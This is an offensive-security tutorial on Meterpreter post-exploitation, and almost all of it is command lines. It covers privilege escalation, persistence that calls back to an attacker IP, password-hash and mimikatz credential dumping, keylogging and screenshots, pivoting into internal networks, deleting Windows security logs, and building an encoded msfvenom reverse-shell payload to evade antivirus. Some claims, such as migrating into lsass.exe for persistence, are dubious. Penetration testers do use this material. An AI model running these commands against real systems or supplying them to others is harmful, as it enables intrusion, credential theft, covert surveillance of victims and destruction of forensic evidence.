# Meterpreter: Advanced Post-Exploitation

## Introduction
Meterpreter is an advanced payload within the Metasploit Framework that provides an interactive shell and extensive post-exploitation capabilities. This guide covers intermediate-level Meterpreter functionalities, including privilege escalation, persistence, network pivoting, and stealth techniques.

## Table of Contents
- [Understanding Meterpreter](#understanding-meterpreter)
- [Basic Meterpreter Commands](#basic-meterpreter-commands)
- [Privilege Escalation](#privilege-escalation)
- [Persistence Techniques](#persistence-techniques)
- [File System Manipulation](#file-system-manipulation)
- [Capturing Credentials](#capturing-credentials)
- [Process Migration](#process-migration)
- [Pivoting and Lateral Movement](#pivoting-and-lateral-movement)
- [Capturing Screenshots and Keystrokes](#capturing-screenshots-and-keystrokes)
- [Clearing Traces](#clearing-traces)
- [Bypassing Antivirus and Evasion](#bypassing-antivirus-and-evasion)
- [Conclusion](#conclusion)

## Understanding Meterpreter
Meterpreter is an in-memory payload that minimizes disk footprint and provides stealthy post-exploitation capabilities. It supports:
- Command execution
- File system manipulation
- Credential dumping
- Process migration
- Network pivoting
- Evasion techniques

## Basic Meterpreter Commands
Once a Meterpreter session is active, use these commands:
```bash
meterpreter > sysinfo    # Display system information
meterpreter > getuid     # Show current user privileges
meterpreter > help       # List available commands
```

## Privilege Escalation
To elevate privileges, use:
```bash
meterpreter > getsystem  # Attempt to escalate privileges
```
If `getsystem` fails, manually exploit local vulnerabilities:
```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```
Identify potential exploits and run them accordingly.

## Persistence Techniques
To maintain access after reboot, use:
```bash
meterpreter > run persistence -U -i 5 -p 4444 -r <attacker_IP>
```
### Explanation:
- `-U`: Start on user login.
- `-i 5`: Attempt every 5 seconds.
- `-p 4444`: Connect back on port 4444.
- `-r <attacker_IP>`: Attacker machine's IP address.

## File System Manipulation
### Listing and Downloading Files
```bash
meterpreter > ls
meterpreter > download C:\sensitive_file.txt /tmp/
```
### Uploading Files
```bash
meterpreter > upload /tmp/malware.exe C:\Users\Public\malware.exe
```

## Capturing Credentials
Dump credentials using:
```bash
meterpreter > hashdump  # Extract Windows password hashes
meterpreter > run post/windows/gather/credentials/mimikatz
```
Use `mimikatz` to extract plaintext credentials from memory.

## Process Migration
To stay hidden and avoid detection, migrate to a system process:
```bash
meterpreter > ps  # List running processes
meterpreter > migrate <PID>  # Migrate to a target process ID
```
Migrating to `explorer.exe` or `lsass.exe` ensures better persistence.

## Pivoting and Lateral Movement
Set up a SOCKS proxy for pivoting:
```bash
meterpreter > run post/multi/manage/socks_proxy
```
Use `autoroute` to route traffic through the compromised host:
```bash
meterpreter > run autoroute -s 192.168.1.0/24
```
Now, use Metasploit modules to attack internal systems.

## Capturing Screenshots and Keystrokes
### Capturing Screenshots
```bash
meterpreter > screenshot  # Capture the target's screen
```
### Enabling Keylogging
```bash
meterpreter > keyscan_start  # Start keylogger
meterpreter > keyscan_dump   # Dump recorded keystrokes
meterpreter > keyscan_stop   # Stop keylogger
```

## Clearing Traces
To remove logs and traces:
```bash
meterpreter > run post/windows/manage/clearlogs
```
Manually delete artifacts:
```bash
meterpreter > rm C:\Windows\System32\winevt\Logs\Security.evtx
```

## Bypassing Antivirus and Evasion
### Using Encoded Payloads
To evade antivirus detection, generate an encoded payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe
```
### Reflective DLL Injection
To avoid writing to disk, use Reflective DLL Injection:
```bash
meterpreter > run post/windows/manage/reflective_dll_injection
```

## Conclusion
This guide covered intermediate Meterpreter techniques, including privilege escalation, persistence, file system manipulation, credential dumping, process migration, network pivoting, and evasion tactics. These techniques are crucial for stealthy and effective post-exploitation.

_For further learning, refer to [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)._
